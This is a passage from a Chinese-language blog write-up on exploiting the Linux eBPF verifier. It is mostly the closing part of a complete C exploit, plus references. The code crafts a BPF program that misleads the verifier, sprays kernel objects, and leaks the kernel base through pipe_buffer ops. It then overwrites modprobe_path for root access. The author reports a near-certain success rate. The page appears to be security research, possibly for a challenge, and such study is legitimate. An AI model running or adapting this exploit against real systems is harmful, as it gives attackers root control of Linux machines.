BPF_ALU64_IMM(BPF_AND, BPF_REG_6, <span class="number">0x1</span>),                         <span class="comment">// R6 = 0x1 [verifier 0]</span></span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_8, <span class="number">0</span>),                   <span class="comment">// r5 = value2[0] = len</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_5, <span class="number">0xdead</span>, <span class="number">2</span>),                     <span class="comment">// leak map_addr</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">2</span>),                           <span class="comment">// r6 = 2 [verifier 0]</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, <span class="number">0xdead</span>, <span class="number">1</span>),                     <span class="comment">// jmp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">8</span>),                           <span class="comment">// r6 = 8 </span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),                            <span class="comment">// r1 = ctx</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),                                    <span class="comment">// r2 = 0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),                           <span class="comment">// r3 = fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>),                         <span class="comment">// r3 = fp -8</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),                                    <span class="comment">// r4 = 8</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_4, BPF_REG_6),                   <span class="comment">// r4 = 10 [verifier 8]</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP|BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes), <span class="comment">// args: r1 = ctx, r2 = 0, r3 = fp -8, r4 = 10 [verifier 8]</span></span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_10, <span class="number">-8</span>),                 <span class="comment">// r9 = value1 ptr</span></span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_8, <span class="number">0</span>),                   <span class="comment">// r5 = value2[0] = len</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_4, <span class="number">0xdead</span>, <span class="number">4</span>),                     <span class="comment">// jmp</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_4, <span class="number">0xbeef</span>, <span class="number">3</span>),                     <span class="comment">// jmp</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_8, <span class="number">8</span>),                   <span class="comment">// r5 = value2[1]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_5, <span class="number">0</span>),                   <span class="comment">// value1[0] = value2[0]</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_4, <span class="number">0xdeef</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_9, <span class="number">0</span>),                   <span class="comment">// r5 = value1[0]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, <span class="number">0</span>),                   <span class="comment">// value2[0] = value1[0]</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                                    <span class="comment">// r0 = 0</span></span><br><span class="line">    BPF_EXIT_INSN(),                                                <span class="comment">// exit()</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>) &amp;prog,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]),</span><br><span class="line">    .license = (<span class="type">uint64_t</span>) <span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>) bpf_log_buf,</span><br><span class="line">    .log_size = LOG_BUF_SIZE,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/tmp/elf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger</span><span class="params">()</span> &#123;</span><br><span class="line">    write(sockets[<span class="number">0</span>], trigger_buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VALUE_SIZE 0x1000</span></span><br><span class="line"><span class="type">int</span> spray_bpf_fd[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_bpf_map</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray bpf map.&quot;</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *value = (<span class="type">uint64_t</span>*)<span class="built_in">calloc</span>(VALUE_SIZE, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        spray_bpf_fd[i] = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="type">int</span>), VALUE_SIZE, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (spray_bpf_fd[i] &lt; <span class="number">0</span>) perror(<span class="string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="string">&quot;BPF_MAP_CREATE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] prepare bpf map&quot;</span>);</span><br><span class="line">    value1 = (<span class="type">uint64_t</span>*)<span class="built_in">calloc</span>(VALUE_SIZE, <span class="number">1</span>);</span><br><span class="line">    value2 = (<span class="type">uint64_t</span>*)<span class="built_in">calloc</span>(VALUE_SIZE, <span class="number">1</span>);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_fd1 = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="type">int</span>), VALUE_SIZE, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (map_fd1 &lt; <span class="number">0</span>) perror(<span class="string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="string">&quot;BPF_MAP_CREATE&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] map fd1: %d \n&quot;</span>, map_fd1);  <span class="comment">// 83</span></span><br><span class="line"></span><br><span class="line">    map_fd2 = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="type">int</span>), VALUE_SIZE, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (map_fd2 &lt; <span class="number">0</span>) perror(<span class="string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="string">&quot;BPF_MAP_CREATE&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] map fd2: %d \n&quot;</span>, map_fd2);  <span class="comment">// 84</span></span><br><span class="line"></span><br><span class="line">    prog_fd = bpf(BPF_PROG_LOAD, &amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (prog_fd &lt; <span class="number">0</span>) <span class="built_in">puts</span>(bpf_log_buf), perror(<span class="string">&quot;BPF_PROG_LOAD&quot;</span>), err_exit(<span class="string">&quot;BPF_PROG_LOAD&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;socketpair()&quot;</span>), err_exit(<span class="string">&quot;socketpair()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd)) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;socketpair SO_ATTACH_BPF&quot;</span>), err_exit(<span class="string">&quot;socketpair()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">leak_data</span><span class="params">(<span class="type">size_t</span> address)</span>&#123;</span><br><span class="line">    value2[<span class="number">0</span>] = BPF_VICTIM_READ_BY_ADDRESS;</span><br><span class="line">    value2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    bpf_map_update_elem(map_fd2, &amp;key, value2, BPF_ANY);</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(trigger_buf + <span class="number">8</span>) = address - <span class="number">0x18</span>;</span><br><span class="line">    trigger();</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    bpf_map_lookup_elem(map_fd2, &amp;key, buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span>*)buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">leak_data_by_2bytes</span><span class="params">(<span class="type">int</span> bytes)</span>&#123;</span><br><span class="line">    value2[<span class="number">0</span>] = BPF_VICTIM_READ_BY_2BYTES;</span><br><span class="line">    bpf_map_update_elem(map_fd2, &amp;key, value2, BPF_ANY);</span><br><span class="line">    trigger_buf[<span class="number">8</span>+<span class="number">1</span>] = bytes;</span><br><span class="line">    trigger();</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    bpf_map_lookup_elem(map_fd2, &amp;key, buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span>*)buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">data_wirte</span><span class="params">(<span class="type">size_t</span> address, <span class="type">size_t</span> data)</span>&#123;</span><br><span class="line">    value2[<span class="number">0</span>] = BPF_VICTIM_WRITE_BY_ADDRESS;</span><br><span class="line">    value2[<span class="number">1</span>] = data;  </span><br><span class="line">    bpf_map_update_elem(map_fd2, &amp;key, value2, BPF_ANY);</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(trigger_buf + <span class="number">8</span>) = address;</span><br><span class="line">    trigger();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;   </span><br><span class="line">    init();</span><br><span class="line">    spray_pipes(<span class="number">0</span>, MAX_PIPE_COUNT);</span><br><span class="line">    spray_bpf_map();</span><br><span class="line">    prep();</span><br><span class="line">    pipes_resize();</span><br><span class="line"></span><br><span class="line">    pipe_buffer_init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(trigger_buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(trigger_buf));</span><br><span class="line">    value2[<span class="number">0</span>] = BPF_VICTIM_READ_BY_2BYTES;</span><br><span class="line">    bpf_map_update_elem(map_fd1, &amp;key, value1, BPF_ANY);</span><br><span class="line">    bpf_map_update_elem(map_fd2, &amp;key, value2, BPF_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pipe_ops = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> victim_index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak kernel addrss&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> is_map = <span class="number">1</span>;</span><br><span class="line">        trigger_buf[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">        bpf_map_lookup_elem(map_fd2, &amp;key, buf);</span><br><span class="line">        <span class="type">uint64_t</span> data = leak_data_by_2bytes(i*<span class="number">0x20</span>);</span><br><span class="line">        <span class="keyword">if</span> ((data &amp; <span class="number">0xffffffff00000000</span>) == (<span class="number">0xffffffff00000000</span>))&#123;</span><br><span class="line">            is_map = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(pipe_ops == <span class="number">-1</span>)&#123;</span><br><span class="line">                pipe_ops = data;</span><br><span class="line">                victim_index = i*<span class="number">0x10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is_map)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] page %d (bpf_array):\n&quot;</span>, i);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>((data &amp; <span class="number">0xffffffff00000000</span>) == (<span class="number">0xffffffff00000000</span>))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] page %d (pipe_buffer):\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        trigger_buf[<span class="number">8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x00: %-016llx ; &quot;</span>, leak_data_by_2bytes(i*<span class="number">0x20</span>));</span><br><span class="line">        trigger_buf[<span class="number">8</span>] = <span class="string">&#x27;\x08&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x08: %-016llx ; &quot;</span>, leak_data_by_2bytes(i*<span class="number">0x20</span>));</span><br><span class="line">        trigger_buf[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x10: %-016llx ; &quot;</span>, leak_data_by_2bytes(i*<span class="number">0x20</span>));</span><br><span class="line">        trigger_buf[<span class="number">8</span>] = <span class="string">&#x27;\x18&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x18: %-016llx\n&quot;</span>, leak_data_by_2bytes(i*<span class="number">0x20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pipe_ops == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to leak kernel address&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hexx(<span class="string">&quot;pipe buffer ops&quot;</span>, pipe_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] pipe buffer ops idx: %d \n&quot;</span>, victim_index);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base = pipe_ops - <span class="number">0x142c580</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> modprobe = pipe_ops + <span class="number">0xf1c820</span>;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe&quot;</span>, modprobe);</span><br><span class="line"></span><br><span class="line">    data_wirte(modprobe, <span class="number">0x782f706d742f</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] write /tmp/x to modprobe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_flag();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果如下：  </p>
<img src="/2025/07/24/ebpf/0.png" class="" title="我的图图呢"> 

<p>成功率接近百分百（至少笔者还没失败过）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">https://arttnba3.cn/2023/05/31/EBPF_0X00/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61670993/article/details/136558244">https://blog.csdn.net/qq_61670993/article/details/136558244</a><br><a target="_blank" rel="noopener" href="https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch">https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">Link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">3.1.</span> <span class="toc-text">重要结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">3.3.</span> <span class="toc-text">任意地址写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACmodprobe"><span class="toc-number">4.</span> <span class="toc-text">高版本modprobe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/07/24/ebpf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/07/24/ebpf/&text=Jailbreaking eBPF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/07/24/ebpf/&is_video=false&description=Jailbreaking eBPF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jailbreaking eBPF&body=Check out this article: https://qanux.github.io/2025/07/24/ebpf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/07/24/ebpf/&title=Jailbreaking eBPF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/07/24/ebpf/&name=Jailbreaking eBPF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/07/24/ebpf/&t=Jailbreaking eBPF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
